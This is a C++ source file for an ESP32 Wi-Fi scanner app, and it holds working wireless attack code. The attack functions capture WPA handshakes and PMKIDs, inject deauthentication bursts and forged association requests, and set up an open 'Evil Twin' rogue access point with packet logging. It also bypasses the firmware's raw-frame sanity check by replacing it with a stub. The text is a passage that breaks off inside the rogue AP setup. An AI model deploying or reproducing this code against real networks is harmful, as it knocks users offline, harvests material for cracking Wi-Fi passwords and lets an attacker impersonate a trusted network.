#include <Tactility/RecursiveMutex.h>
#include <Tactility/Timer.h>
#include <Tactility/app/alertdialog/AlertDialog.h>
#include <Tactility/app/wificonnect/WifiConnect.h>
#include <Tactility/service/music/Music.h>
#include <Tactility/service/neopixel/NeoPixel.h>
#include <Tactility/service/wifi/Wifi.h>

#include <app/event.h>
#include <app/manager.h>
#include <app/manifest.h>
#include <app/scheduler.h>

#include <lvgl_window_manager/window_manager.h>

#include <tactility/check.h>
#include <tactility/log.h>
#include <tactility/drivers/backlight.h>
#include <tactility/drivers/display.h>

extern "C" void romhack_keypad_set_media_cb(void (*cb)(uint32_t, bool));

#include "OuiTable.h"

#include <algorithm>
#include <atomic>
#include <cmath>
#include <cstdio>
#include <cstring>
#include <map>
#include <memory>
#include <string>
#include <vector>

#include <lvgl/lvgl.h>
#include <lvgl/widgets/toolbar.h>

#ifdef ESP_PLATFORM
#include <esp_wifi.h>
#include <esp_timer.h>
#include <esp_netif.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <time.h>
#endif

#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
    return 0;
}

#ifdef __cplusplus
}
#endif

namespace tt::app::wifiscanner {

extern const ::AppManifest manifest;

namespace {

constexpr auto* TAG = "WifiScanner";
constexpr uint16_t MAX_RECORDS = 40;
constexpr uint32_t REFRESH_MS = 1000;
constexpr uint32_t ROW_EXPIRY_MS = 20000;

constexpr int MAX_SERIES = 8;
constexpr int CHART_POINTS = 33;
constexpr float BELL_HALF_WIDTH = 2.0f;
constexpr float CH_AXIS_MIN = 0.0f;
constexpr float CH_AXIS_MAX = 14.0f;
constexpr int32_t SIGNAL_FLOOR_DBM = -100;
constexpr int32_t SIGNAL_RANGE_DB = 70;
constexpr uint32_t HOP_INTERVAL_MS = 300;
constexpr int MAX_PROBED_SSIDS = 4;

inline float channelFraction(int channel) {
    return ((float)channel - CH_AXIS_MIN) / (CH_AXIS_MAX - CH_AXIS_MIN);
}

const uint32_t SERIES_COLORS[MAX_SERIES] = {
    0xFF0000, 0xFF7F00, 0xFFFF00, 0x00FF00, 0x00FFFF, 0x0000FF, 0x8000FF, 0xFF00FF,
};

enum class Page { Graph, List, Detail, Clients, EvilTwinDetail };
enum class RadioMode { Stopped, ActiveScan, Capture };

uint64_t bssidKey(const uint8_t* bssid) {
    uint64_t key = 0;
    for (int i = 0; i < 6; i++) key = (key << 8) | bssid[i];
    return key;
}

uint64_t nowMs() { return (uint64_t)lv_tick_get(); }

struct SeenAp {
    WifiApRecord record{};
    uint64_t firstSeenMs = 0;
    uint64_t lastSeenMs = 0;
    int8_t rssiMin = 0;
    int8_t rssiMax = 0;
    bool fromCapture = false;
    uint32_t packetCount = 0;
    int colorIndex = 0;
};

constexpr int HS_MAX_APS = 16;
constexpr int HS_FRAME_MAX = 320;
constexpr int HS_BEACON_MAX = 400;

struct HandshakeCapture {
    char ssid[33] = {};
    uint8_t beacon[HS_BEACON_MAX] = {};
    int beaconLen = 0;
    uint8_t eapol[4][HS_FRAME_MAX] = {};
    int eapolLen[4] = {0, 0, 0, 0};
    uint8_t msgMask = 0;
    bool hasPmkid = false;
    bool saved = false;
};

struct CapturedClient {
    uint8_t mac[6] = {};
    uint64_t firstSeenMs = 0;
    uint64_t lastSeenMs = 0;
    int8_t lastRssi = 0;
    uint64_t associatedBssid = 0;
    std::vector<std::string> probedSsids;
    uint32_t packetCount = 0;
    uint32_t txCount = 0;
    uint32_t rxCount = 0;
};

struct Context {
    uint32_t appInstanceId = 0;
    WindowId window = 0;

    RecursiveMutex mutex;
    std::unique_ptr<Timer> timer = nullptr;
    std::unique_ptr<Timer> ledTimer = nullptr;
    std::atomic<bool> vuFeeding{false};
    std::atomic<int> vuLevel{0};
    std::atomic<uint32_t> vuRefreshTick{0};

    Page page = Page::Graph;
    std::map<uint64_t, SeenAp> seen;
    std::map<uint64_t, CapturedClient> clients;
    std::map<uint64_t, HandshakeCapture> handshakes;
    int handshakesSaved = 0;
    int pmkidSeen = 0;
    int deauthBurstsSent = 0;
    bool evilTwinActive = false;
    std::atomic<bool> evilTwinLogging{false};
    std::atomic<uint32_t> deauthDialogId{0};
    std::atomic<uint32_t> clientDeauthDialogId{0};
    std::atomic<uint32_t> pmkidDialogId{0};
    std::atomic<uint32_t> evilTwinDialogId{0};
    uint64_t targetClientKey = 0;
    std::vector<uint64_t> visible;
    uint64_t selectedKey = 0;
    uint32_t detailBeaconBaseline = 0;
    int detailChannel = 0;
    int nextColor = 0;
    RadioMode mode = RadioMode::ActiveScan;

    bool ledSaved = false;
    service::neopixel::Animation savedAnim = service::neopixel::Animation::Off;
    service::neopixel::ColorMode savedColorMode = service::neopixel::ColorMode::Static;
    uint8_t savedR = 0, savedG = 0, savedB = 0, savedBrightness = 0, savedSpeed = 0;
    bool savedVuActive = false, savedVuDecay = false, savedVuAutoGain = false, savedVuBeatFlash = false, savedVuPeakHold = false;
    service::neopixel::VuPalette savedVuPalette = service::neopixel::VuPalette::Classic;
    service::neopixel::VuOrigin savedVuOrigin = service::neopixel::VuOrigin::BothLeft;
    uint8_t savedVuR = 0, savedVuG = 0, savedVuB = 0, savedVuBrightness = 0, savedVuSensitivity = 0;
    int ledViewApplied = -1;
    int ledColorApplied = -1;

    lv_obj_t* toolbar = nullptr;
    lv_obj_t* statusLabel = nullptr;
    lv_obj_t* modeBadge = nullptr;
    lv_obj_t* modeBadgeLabel = nullptr;
    lv_obj_t* statsLabel = nullptr;
    lv_obj_t* activeChannelIndicator = nullptr;
    lv_obj_t* graphPage = nullptr;
    lv_obj_t* chart = nullptr;
    lv_obj_t* labelLayer = nullptr;
    lv_chart_series_t* series[MAX_SERIES] = {};
    lv_obj_t* scanButton = nullptr;
    lv_obj_t* captureButton = nullptr;
    lv_obj_t* stopButton = nullptr;
    lv_obj_t* listPage = nullptr;
    lv_obj_t* list = nullptr;
    std::map<uint64_t, lv_obj_t*> rows;
    lv_obj_t* detailPage = nullptr;
    lv_obj_t* detailScroll = nullptr;
    lv_obj_t* detailClientsButton = nullptr;
    lv_obj_t* detailLockButton = nullptr;
    lv_obj_t* detailDeauthButton = nullptr;
    lv_obj_t* detailPmkidButton = nullptr;
    lv_obj_t* detailEvilTwinButton = nullptr;
    lv_obj_t* detailEvilTwinDetailsButton = nullptr;
    lv_obj_t* detailHsSummary = nullptr;
    lv_obj_t* detailSsidLabel = nullptr;
    lv_obj_t* detailMacLabel = nullptr;
    lv_obj_t* detailSecLabel = nullptr;
    lv_obj_t* detailChanLabel = nullptr;
    lv_obj_t* detailPowerLabel = nullptr;
    lv_obj_t* detailPhyLabel = nullptr;
    lv_obj_t* detailTimeLabel = nullptr;
    lv_obj_t* detailDeauthLabel = nullptr;
    lv_obj_t* connectButton = nullptr;
    lv_obj_t* clientsPage = nullptr;
    lv_obj_t* clientsList = nullptr;
    std::map<uint64_t, lv_obj_t*> clientRows;

    lv_obj_t* etDetailPage = nullptr;
    lv_obj_t* etStatusLabel = nullptr;
    lv_obj_t* etClientsList = nullptr;
    lv_obj_t* etLogToggleButton = nullptr;
};

#ifdef ESP_PLATFORM

std::atomic<Context*> g_captureCtx{nullptr};
std::atomic<bool> g_captureRunning{false};
std::atomic<bool> g_captureStopped{true};
std::atomic<int> g_hopChannel{1};
std::atomic<int> g_lockChannel{0};

std::string macToString(const uint8_t* mac);

void parseBeaconIes(const uint8_t* ies, int iesLen, uint16_t capability,
    std::string& ssidOut, bool& ssidSeen, WifiAuthenticationType& authOut) {
    bool privacy = (capability & 0x0010) != 0;
    bool hasRsn = false;
    bool hasWpa = false;
    ssidSeen = false;
    int i = 0;
    while (i + 2 <= iesLen) {
        uint8_t tag = ies[i];
        uint8_t len = ies[i + 1];
        if (i + 2 + len > iesLen) break;
        const uint8_t* data = ies + i + 2;
        if (tag == 0) {
            ssidOut.assign(reinterpret_cast<const char*>(data), len);
            ssidSeen = len > 0;
        } else if (tag == 48) {
            hasRsn = true;
        } else if (tag == 221 && len >= 4 && data[0] == 0x00 && data[1] == 0x50 && data[2] == 0xF2 && data[3] == 0x01) {
            hasWpa = true;
        }
        i += 2 + len;
    }
    if (!privacy) authOut = WIFI_AUTHENTICATION_TYPE_OPEN;
    else if (hasRsn && hasWpa) authOut = WIFI_AUTHENTICATION_TYPE_WPA_WPA2_PSK;
    else if (hasRsn) authOut = WIFI_AUTHENTICATION_TYPE_WPA2_PSK;
    else if (hasWpa) authOut = WIFI_AUTHENTICATION_TYPE_WPA_PSK;
    else authOut = WIFI_AUTHENTICATION_TYPE_WEP;
}

std::string parseProbeRequestSsid(const uint8_t* ies, int iesLen) {
    int i = 0;
    while (i + 2 <= iesLen) {
        uint8_t tag = ies[i];
        uint8_t len = ies[i + 1];
        if (i + 2 + len > iesLen) break;
        if (tag == 0 && len > 0) {
            return std::string(reinterpret_cast<const char*>(ies + i + 2), len);
        }
        i += 2 + len;
    }
    return {};
}

void sanitizeAscii(char* str) {
    if (!str) return;
    char* r = str;
    char* w = str;
    while (*r) {
        unsigned char c = (unsigned char)*r;
        if (c == 0xC3 && *(r + 1)) {
            unsigned char c2 = (unsigned char)*(r + 1);
            if (c2 >= 0x80 && c2 <= 0x85) *w++ = 'A';
            else if (c2 >= 0xA0 && c2 <= 0xA5) *w++ = 'a';
            else if (c2 >= 0x88 && c2 <= 0x8B) *w++ = 'E';
            else if (c2 >= 0xA8 && c2 <= 0xAB) *w++ = 'e';
            else if (c2 >= 0x8C && c2 <= 0x8F) *w++ = 'I';
            else if (c2 >= 0xAC && c2 <= 0xAF) *w++ = 'i';
            else if (c2 >= 0x92 && c2 <= 0x96) *w++ = 'O';
            else if (c2 >= 0xB2 && c2 <= 0xB6) *w++ = 'o';
            else if (c2 >= 0x99 && c2 <= 0x9C) *w++ = 'U';
            else if (c2 >= 0xB9 && c2 <= 0xBC) *w++ = 'u';
            else if (c2 == 0x87) *w++ = 'C';
            else if (c2 == 0xA7) *w++ = 'c';
            else if (c2 == 0x91) *w++ = 'N';
            else if (c2 == 0xB1) *w++ = 'n';
            else *w++ = '?';
            r += 2;
        } else if (c > 127) {
            *w++ = '?';
            r++;
        } else {
            *w++ = *r++;
        }
    }
    *w = '\0';
}

void upsertApFromCapture(Context* ctx, const uint8_t* bssid, const std::string& ssid, bool ssidSeen,
    int channel, int8_t rssi, WifiAuthenticationType auth) {
    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(bssid);
    uint64_t now = nowMs();
    auto it = ctx->seen.find(key);
    if (it == ctx->seen.end()) {
        SeenAp ap{};
        memcpy(ap.record.bssid, bssid, 6);
        if (ssidSeen) {
            size_t len = std::min<size_t>(ssid.size(), sizeof(ap.record.ssid) - 1);
            memcpy(ap.record.ssid, ssid.data(), len);
            ap.record.ssid[len] = '\0';
            sanitizeAscii(ap.record.ssid);
        }
        ap.record.channel = channel;
        ap.record.rssi = rssi;
        ap.record.authentication_type = auth;
        ap.record.pairwise_cipher = WIFI_AP_CIPHER_UNKNOWN;
        ap.firstSeenMs = now;
        ap.lastSeenMs = now;
        ap.rssiMin = ap.rssiMax = rssi;
        ap.fromCapture = true;
        ap.colorIndex = ctx->nextColor++ % MAX_SERIES;
        ap.packetCount = 1;
        ctx->seen.emplace(key, ap);
    } else {
        SeenAp& ap = it->second;
        if (ssidSeen && ap.record.ssid[0] == '\0') {
            size_t len = std::min<size_t>(ssid.size(), sizeof(ap.record.ssid) - 1);
            memcpy(ap.record.ssid, ssid.data(), len);
            ap.record.ssid[len] = '\0';
            sanitizeAscii(ap.record.ssid);
        }
        ap.record.channel = channel;
        ap.record.rssi = rssi;
        ap.lastSeenMs = now;
        ap.packetCount++;
        ap.rssiMin = std::min(ap.rssiMin, rssi);
        ap.rssiMax = std::max(ap.rssiMax, rssi);
        if (ap.fromCapture) ap.record.authentication_type = auth;
    }
    ctx->mutex.unlock();
}

void upsertClientProbe(Context* ctx, const uint8_t* mac, const std::string& probedSsid, int8_t rssi) {
    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(mac);
    uint64_t now = nowMs();
    auto& client = ctx->clients[key];
    if (client.packetCount == 0) {
        memcpy(client.mac, mac, 6);
        client.firstSeenMs = now;
    }
    client.lastSeenMs = now;
    client.lastRssi = rssi;
    client.packetCount++;
    if (!probedSsid.empty() &&
        std::find(client.probedSsids.begin(), client.probedSsids.end(), probedSsid) == client.probedSsids.end() &&
        client.probedSsids.size() < MAX_PROBED_SSIDS) {
        client.probedSsids.push_back(probedSsid);
    }
    ctx->mutex.unlock();
}

void upsertClientAssociation(Context* ctx, const uint8_t* mac, const uint8_t* bssid, int8_t rssi, bool clientSent) {
    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(mac);
    uint64_t now = nowMs();
    auto& client = ctx->clients[key];
    if (client.packetCount == 0) {
        memcpy(client.mac, mac, 6);
        client.firstSeenMs = now;
    }
    client.lastSeenMs = now;
    client.lastRssi = rssi;
    client.associatedBssid = bssidKey(bssid);
    client.packetCount++;
    if (clientSent) client.txCount++; else client.rxCount++;
    ctx->mutex.unlock();
}

void storeBeaconForHandshake(Context* ctx, const uint8_t* bssid, const uint8_t* frame, int len, const std::string& ssid) {
    if (!ctx->mutex.lock(0)) return;
    auto it = ctx->handshakes.find(bssidKey(bssid));
    if (it != ctx->handshakes.end() && it->second.beaconLen == 0) {
        int n = std::min(len, HS_BEACON_MAX);
        memcpy(it->second.beacon, frame, n);
        it->second.beaconLen = n;
        if (!ssid.empty() && it->second.ssid[0] == '\0') {
            size_t s = std::min(ssid.size(), sizeof(it->second.ssid) - 1);
            memcpy(it->second.ssid, ssid.data(), s);
            it->second.ssid[s] = '\0';
        }
    }
    ctx->mutex.unlock();
}

void handleEapol(Context* ctx, const uint8_t* payload, int len, uint8_t subtype, const uint8_t* addr1, const uint8_t* addr2) {
    int hdr = 24;
    if (subtype & 0x08) hdr += 2;
    if (len < hdr + 8 + 7) return;
    const uint8_t* llc = payload + hdr;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03)) return;
    if (((llc[6] << 8) | llc[7]) != 0x888E) return;
    const uint8_t* eapol = llc + 8;
    int eapolLen = len - hdr - 8;
    if (eapolLen < 7 || eapol[1] != 0x03) return;
    uint16_t keyInfo = (eapol[5] << 8) | eapol[6];
    bool mic = keyInfo & 0x0100, ack = keyInfo & 0x0080, install = keyInfo & 0x0040, secure = keyInfo & 0x0200;
    int slot;
    if (ack && !mic) slot = 0;
    else if (mic && !ack && !secure) slot = 1;
    else if (ack && mic && install) slot = 2;
    else if (mic && !ack && secure) slot = 3;
    else return;
    const uint8_t* bssid = (slot == 0 || slot == 2) ? addr2 : addr1;

    bool pmkid = false;
    if (slot == 0) {
        for (int i = 0; i + 6 <= eapolLen; i++) {
            if (eapol[i] == 0xDD && eapol[i + 2] == 0x00 && eapol[i + 3] == 0x0F &&
                eapol[i + 4] == 0xAC && eapol[i + 5] == 0x04) { pmkid = true; break; }
        }
    }

    if (!ctx->mutex.lock(0)) return;
    uint64_t key = bssidKey(bssid);
    auto it = ctx->handshakes.find(key);
    if (it == ctx->handshakes.end()) {
        if ((int)ctx->handshakes.size() >= HS_MAX_APS) { ctx->mutex.unlock(); return; }
        it = ctx->handshakes.emplace(key, HandshakeCapture{}).first;
        auto sit = ctx->seen.find(key);
        if (sit != ctx->seen.end()) {
            strncpy(it->second.ssid, sit->second.record.ssid, sizeof(it->second.ssid) - 1);
        }
    }
    HandshakeCapture& hc = it->second;
    if (hc.eapolLen[slot] == 0) {
        int n = std::min(len, HS_FRAME_MAX);
        memcpy(hc.eapol[slot], payload, n);
        hc.eapolLen[slot] = n;
        hc.msgMask |= (uint8_t)(1 << slot);
        hc.saved = false;
    }
    if (pmkid && !hc.hasPmkid) { hc.hasPmkid = true; ctx->pmkidSeen++; }
    ctx->mutex.unlock();
}

void logEvilTwinPacket(const uint8_t* payload, int len);

void onPromiscuousPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    Context* ctx = g_captureCtx.load();
    if (ctx == nullptr) return;

    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* payload = pkt->payload;
    int rawLen = pkt->rx_ctrl.sig_len;
    if (rawLen < 28) return;
    int len = rawLen - 4;

    if (ctx->evilTwinLogging.load()) {
        logEvilTwinPacket(payload, len);
    }

    uint16_t fc = payload[0] | (payload[1] << 8);
    uint8_t frameType = (fc >> 2) & 0x3;
    uint8_t frameSubtype = (fc >> 4) & 0xF;
    bool toDs = (fc & 0x0100) != 0;
    bool fromDs = (fc & 0x0200) != 0;
    const uint8_t* addr1 = payload + 4;
    const uint8_t* addr2 = payload + 10;
    const uint8_t* addr3 = payload + 16;
    int8_t rssi = pkt->rx_ctrl.rssi;
    int channel = pkt->rx_ctrl.channel;

    if (frameType == 0) {
        if ((frameSubtype == 8 || frameSubtype == 5) && len >= 24 + 12) {
            uint16_t capability = payload[24 + 10] | (payload[24 + 11] << 8);
            std::string ssid;
            bool ssidSeen = false;
            WifiAuthenticationType auth = WIFI_AUTHENTICATION_TYPE_OPEN;
            parseBeaconIes(payload + 24 + 12, len - 24 - 12, capability, ssid, ssidSeen, auth);
            upsertApFromCapture(ctx, addr3, ssid, ssidSeen, channel, rssi, auth);
            storeBeaconForHandshake(ctx, addr3, payload, len, ssid);
        } else if (frameSubtype == 4) {
            std::string ssid = parseProbeRequestSsid(payload + 24, len - 24);
            upsertClientProbe(ctx, addr2, ssid, rssi);
        }
    } else if (frameType == 2) {
        if (toDs && !fromDs) {
            upsertClientAssociation(ctx, addr2, addr1, rssi, true);
        } else if (!toDs && fromDs) {
            upsertClientAssociation(ctx, addr1, addr2, rssi, false);
        }
        handleEapol(ctx, payload, len, frameSubtype, addr1, addr2);
    }
}

constexpr int HOP_SEQUENCE[] = {1, 6, 11, 3, 8, 13, 2, 7, 1, 6, 11, 4, 9, 5, 10, 12};
constexpr int HOP_SEQUENCE_LEN = sizeof(HOP_SEQUENCE) / sizeof(HOP_SEQUENCE[0]);

int32_t hopTask(void* /*arg*/) {
    esp_wifi_set_promiscuous_rx_cb(&onPromiscuousPacket);
    wifi_promiscuous_filter_t filter{};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    int i = 0;
    while (g_captureRunning.load()) {
        int lock = g_lockChannel.load();
        int channel;
        if (lock >= 1 && lock <= 13) {
            channel = lock;
        } else {
            channel = HOP_SEQUENCE[i];
            i = (i + 1) % HOP_SEQUENCE_LEN;
        }
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        g_hopChannel.store(channel);
        vTaskDelay(pdMS_TO_TICKS(HOP_INTERVAL_MS));
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    g_captureStopped.store(true);
    vTaskDelete(nullptr);
    return 0;
}

void startCapture(Context* ctx) {
    if (g_captureRunning.load()) return;
    g_captureCtx.store(ctx);
    g_captureStopped.store(false);
    g_hopChannel.store(0);
    g_captureRunning.store(true);
    xTaskCreatePinnedToCore(
        [](void* arg) { hopTask(arg); },
        "wifi_hop", 3072, nullptr, tskIDLE_PRIORITY + 1, nullptr, WIFI_TASK_CORE_ID);
}

void stopCapture(Context* ctx) {
    if (!g_captureRunning.load()) return;
    g_lockChannel.store(0);
    g_captureRunning.store(false);
    for (int i = 0; i < 100 && !g_captureStopped.load(); i++) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    g_captureCtx.store(nullptr);
    (void)ctx;
}

bool isCaptureSupported() { return true; }

void setCaptureLockChannel(int ch) { g_lockChannel.store(ch); }
int getCaptureLockChannel() { return g_lockChannel.load(); }
int getCurrentRadioChannel() { return g_hopChannel.load(); }

constexpr uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
constexpr int DEAUTH_BURST_SETS = 6;
constexpr int DEAUTH_FRAMES_PER_SET = 6;
constexpr int DEAUTH_FRAME_GAP_MS = 50;
constexpr int DEAUTH_SET_GAP_MS = 200;

constexpr int ASSOC_BURST_SETS = 6;
constexpr int ASSOC_FRAMES_PER_SET = 6;
constexpr int ASSOC_FRAME_GAP_MS = 50;
constexpr int ASSOC_SET_GAP_MS = 200;

std::string macToString(const uint8_t* mac) {
    char text[18];
    snprintf(text, sizeof(text), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return text;
}

void sendDeauthFrame(const uint8_t* addr1, const uint8_t* addr2, const uint8_t* bssid) {
    uint8_t frame[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0,
        0, 0, 0, 0, 0, 0,
        0x00, 0x00,
        0x07, 0x00,
    };
    memcpy(frame + 4, addr1, 6);
    memcpy(frame + 10, addr2, 6);
    memcpy(frame + 16, bssid, 6);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
    if (err != ESP_OK) {
        LOG_W(TAG, "deauth: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
    }
}

struct DeauthTaskParams {
    uint8_t bssid[6];
    uint8_t client[6];
    bool hasClient;
    int channel;
};

void deauthBurstTask(void* arg) {
    auto* params = static_cast<DeauthTaskParams*>(arg);
    
    int i = 0;
    for (; i < 40 && getCurrentRadioChannel() != params->channel; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    const uint8_t* target = params->hasClient ? params->client : BROADCAST_MAC;
    std::string bssidStr = macToString(params->bssid);
    std::string targetStr = macToString(target);

    for (int set = 0; set < DEAUTH_BURST_SETS; set++) {
        LOG_I(TAG, "deauth: burst %d/%d ch%d | BSSID: %s -> Target: %s", 
            set + 1, DEAUTH_BURST_SETS, params->channel, bssidStr.c_str(), targetStr.c_str());
        for (int f = 0; f < DEAUTH_FRAMES_PER_SET; f++) {
            sendDeauthFrame(target, params->bssid, params->bssid);
            if (params->hasClient) {
                sendDeauthFrame(params->bssid, params->client, params->bssid);
            }
            vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_GAP_MS));
        }
        if (set < DEAUTH_BURST_SETS - 1) {
            vTaskDelay(pdMS_TO_TICKS(DEAUTH_SET_GAP_MS));
        }
    }

    delete params;
    vTaskDelete(nullptr);
}

void sendDeauthBurstOnChannel(const uint8_t* bssid, int channel, const uint8_t* client = nullptr) {
    auto* params = new DeauthTaskParams{};
    memcpy(params->bssid, bssid, 6);
    if (client != nullptr) {
        memcpy(params->client, client, 6);
        params->hasClient = true;
    } else {
        params->hasClient = false;
    }
    params->channel = channel;

    xTaskCreatePinnedToCore(deauthBurstTask, "wifi_deauth", 3072, params, tskIDLE_PRIORITY + 1, nullptr, WIFI_TASK_CORE_ID);
}

void sendAssociationRequest(const uint8_t* bssid, const char* ssid, const uint8_t* fakeClient) {
    int ssidLen = ssid ? strlen(ssid) : 0;
    if (ssidLen > 32) ssidLen = 32;

    uint8_t frame[64] = {0};
    frame[0] = 0x00;
    frame[1] = 0x00;
    frame[2] = 0x3a;
    frame[3] = 0x01;
    memcpy(frame + 4, bssid, 6);
    memcpy(frame + 10, fakeClient, 6);
    memcpy(frame + 16, bssid, 6);

    frame[24] = 0x31;
    frame[25] = 0x01;
    frame[26] = 0x0a;
    frame[27] = 0x00;

    int idx = 28;
    frame[idx++] = 0;
    frame[idx++] = ssidLen;
    if (ssidLen > 0) {
        memcpy(frame + idx, ssid, ssidLen);
        idx += ssidLen;
    }

    frame[idx++] = 1;
    frame[idx++] = 8;
    uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    memcpy(frame + idx, rates, 8);
    idx += 8;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, idx, true);
    if (err != ESP_OK) {
        LOG_W(TAG, "assoc_req: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
    }
}

struct AssocTaskParams {
    uint8_t bssid[6];
    char ssid[33];
    int channel;
};

void assocBurstTask(void* arg) {
    auto* params = static_cast<AssocTaskParams*>(arg);

    int i = 0;
    for (; i < 40 && getCurrentRadioChannel() != params->channel; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    uint8_t fakeClient[6] = {0x02, 0xDE, 0xAD, 0xBE, 0xEF, 0x01};
    std::string bssidStr = macToString(params->bssid);
    std::string clientStr = macToString(fakeClient);

    for (int set = 0; set < ASSOC_BURST_SETS; set++) {
        LOG_I(TAG, "assoc_req (PMKID): burst %d/%d ch%d | FakeClient: %s -> AP BSSID: %s (SSID: '%s')", 
            set + 1, ASSOC_BURST_SETS, params->channel, clientStr.c_str(), bssidStr.c_str(), params->ssid);
        for (int j = 0; j < ASSOC_FRAMES_PER_SET; j++) {
            sendAssociationRequest(params->bssid, params->ssid, fakeClient);
            vTaskDelay(pdMS_TO_TICKS(ASSOC_FRAME_GAP_MS));
        }
        if (set < ASSOC_BURST_SETS - 1) {
            vTaskDelay(pdMS_TO_TICKS(ASSOC_SET_GAP_MS));
        }
    }

    delete params;
    vTaskDelete(nullptr);
}

void sendAssociationRequestBurst(const uint8_t* bssid, const char* ssid, int channel) {
    auto* params = new AssocTaskParams{};
    memcpy(params->bssid, bssid, 6);
    if (ssid) {
        strncpy(params->ssid, ssid, sizeof(params->ssid) - 1);
    }
    params->channel = channel;

    xTaskCreatePinnedToCore(assocBurstTask, "wifi_assoc", 3072, params, tskIDLE_PRIORITY + 1, nullptr, WIFI_TASK_CORE_ID);
}

// ---- Evil Twin / Rogue AP & PCAP functions ----

static FILE* g_etPcapFile = nullptr;
static RecursiveMutex g_etPcapMutex;
static std::atomic<uint32_t> g_etPacketsLogged{0};

void pcapU32(FILE* f, uint32_t v) { fwrite(&v, 4, 1, f); }
void pcapU16(FILE* f, uint16_t v) { fwrite(&v, 2, 1, f); }

void pcapRecord(FILE* f, const uint8_t* data, int len) {
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    pcapU32(f, (uint32_t)tv.tv_sec);
    pcapU32(f, (uint32_t)tv.tv_usec);
    pcapU32(f, (uint32_t)len);
    pcapU32(f, (uint32_t)len);
    fwrite(data, 1, len, f);
}

bool startEvilTwinLogging(const char* ssid) {
    if (!g_etPcapMutex.lock(500 / portTICK_PERIOD_MS)) return false;
    if (g_etPcapFile != nullptr) {
        g_etPcapMutex.unlock();
        return true;
    }
    mkdir("/sdcard/wifi-scanner", 0777);
    mkdir("/sdcard/wifi-scanner/eviltwin", 0777);

    char safe[33];
    int j = 0;
    for (int i = 0; ssid && ssid[i] != '\0' && j < 32; i++) {
        char c = ssid[i];
        safe[j++] = (c > 32 && c < 127 && c != '/' && c != '\\') ? c : '_';
    }
    safe[j] = '\0';

    char path[128];
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    if (tv.tv_sec > 1700000000) {
        struct tm tm_info;
        localtime_r(&tv.tv_sec, &tm_info);
        char timeStr[20];
        strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", &tm_info);
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/eviltwin/%s_%s.pcap",
            safe[0] != '\0' ? safe : "eviltwin", timeStr);
    } else {
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/eviltwin/%s_%lu.pcap",
            safe[0] != '\0' ? safe : "eviltwin", (unsigned long)(esp_timer_get_time() / 1000000));
    }

    g_etPcapFile = fopen(path, "wb");
    if (g_etPcapFile != nullptr) {
        pcapU32(g_etPcapFile, 0xA1B2C3D4);
        pcapU16(g_etPcapFile, 2); pcapU16(g_etPcapFile, 4);
        pcapU32(g_etPcapFile, 0); pcapU32(g_etPcapFile, 0);
        pcapU32(g_etPcapFile, 65535);
        pcapU32(g_etPcapFile, 105);
        fflush(g_etPcapFile);
        g_etPacketsLogged.store(0);
        LOG_I(TAG, "Evil Twin PCAP recording started: %s", path);
    } else {
        LOG_E(TAG, "Failed to create Evil Twin PCAP: %s", path);
    }
    g_etPcapMutex.unlock();
    return g_etPcapFile != nullptr;
}

void stopEvilTwinLogging() {
    if (!g_etPcapMutex.lock(500 / portTICK_PERIOD_MS)) return;
    if (g_etPcapFile != nullptr) {
        fflush(g_etPcapFile);
        fclose(g_etPcapFile);
        g_etPcapFile = nullptr;
        LOG_I(TAG, "Evil Twin PCAP closed. Total packets logged: %u", (unsigned)g_etPacketsLogged.load());
    }
    g_etPcapMutex.unlock();
}

void logEvilTwinPacket(const uint8_t* payload, int len) {
    if (g_etPcapFile == nullptr) return;
    if (g_etPcapMutex.lock(0)) {
        if (g_etPcapFile != nullptr) {
            pcapRecord(g_etPcapFile, payload, len);
            uint32_t count = g_etPacketsLogged.fetch_add(1) + 1;
            if ((count % 10) == 0) {
                fflush(g_etPcapFile);
            }
        }
        g_etPcapMutex.unlock();
    }
}

void startEvilTwinAp(const char* ssid, int channel) {
    esp_netif_t* netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (netif == nullptr) {
        esp_netif_create_default_wifi_ap();
    }
    wifi_config_t ap_config = {};
    strlcpy(reinterpret_cast<char*>(ap_config.ap.ssid), ssid, sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = strlen(ssid);
    ap_config.ap.channel = channel;
    ap_config.ap.max_connection = 8;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;

    esp_wifi_set_mode(WIFI_MODE_APSTA);
